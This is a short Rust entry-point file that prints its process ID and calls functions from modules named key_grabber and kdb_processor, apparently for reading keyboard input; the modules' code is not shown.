use std::error::Error;

mod kdb_processor;
mod key_grabber;

fn main() -> Result<(), Box<dyn Error>> {
    // Change this to your actual device path
    println!("Process PID: {}", std::process::id());
    key_grabber::mmm!();

    kdb_processor::process();
    return key_grabber::grub();
}
